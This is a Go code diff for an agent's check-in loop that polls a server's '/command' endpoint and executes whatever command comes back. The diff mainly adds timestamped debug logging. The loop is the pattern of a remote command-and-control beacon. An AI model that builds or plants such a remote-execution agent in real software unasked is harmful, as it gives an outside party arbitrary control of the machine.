@@ -96,29 +96,58 @@ func (a *Agent) runLoop() {
 				continue
 			}
 
+			// Send request to root endpoint
+			resp, err := a.Protocol.SendRequest("/")
+			if err != nil {
+				fmt.Printf("Request error: %v\n", err)
+				time.Sleep(a.Config.ReconnectDelay)
+				continue
+			}
+
+			// Process response
+			body, err := io.ReadAll(resp.Body)
+			resp.Body.Close()
+			if err == nil {
+				currentTime := time.Now().Format("2006-01-02 15:04:05.000")
+				fmt.Printf("[%s] Response: %s\n", currentTime, string(body))
+			}
+
 			// Check for commands
-			resp, err := a.Protocol.SendRequest("/command")
+			resp2, err := a.Protocol.SendRequest("/command")
 			if err != nil {
 				fmt.Printf("Command check error: %v\n", err)
 				time.Sleep(a.Config.ReconnectDelay)
 				continue
 			}
 
+			// After creating the request to /command
+			fmt.Printf("[%s] Checking for commands...\n", time.Now().Format("2006-01-02 15:04:05.000"))
+
 			// Process command response
-			body, err := io.ReadAll(resp.Body)
-			resp.Body.Close()
+			body2, err := io.ReadAll(resp2.Body)
+			resp2.Body.Close()
 			if err == nil {
 				// Parse the response
 				var cmdResp struct {
 					Command    string `json:"command"`
 					HasCommand bool   `json:"hasCommand"`
 				}
-				if err := json.Unmarshal(body, &cmdResp); err == nil {
+				if err := json.Unmarshal(body2, &cmdResp); err == nil {
+					fmt.Printf("[%s] Command check response: hasCommand=%v, command=%s\n",
+						time.Now().Format("2006-01-02 15:04:05.000"),
+						cmdResp.HasCommand,
+						cmdResp.Command)
+
 					if cmdResp.HasCommand {
 						// Execute the command
 						a.executeCommand(cmdResp.Command)
 					}
+				} else {
+					fmt.Printf("[%s] Error parsing command response: %v\n",
+						time.Now().Format("2006-01-02 15:04:05.000"),
+						err)
 				}
+
 			}
 
 			// Sleep before next check-in
@@ -130,7 +159,7 @@ func (a *Agent) runLoop() {
 
 // executeCommand handles command execution and sending results
 func (a *Agent) executeCommand(command string) {
-	fmt.Printf("Executing command: %s\n", command)
+	fmt.Printf("[%s] Executing command: %s\n", time.Now().Format("2006-01-02 15:04:05.000"), command)
 
 	// Execute the command
 	output, err := commands.Execute(command)
@@ -182,5 +211,8 @@ func (a *Agent) executeCommand(command string) {
 	}
 	defer resp.Body.Close()
 
-	fmt.Printf("Command execution complete: %s\n", command)
+	// At the end of executeCommand
+	fmt.Printf("[%s] Command execution complete. Status: %s\n",
+		time.Now().Format("2006-01-02 15:04:05.000"),
+		status)
 }
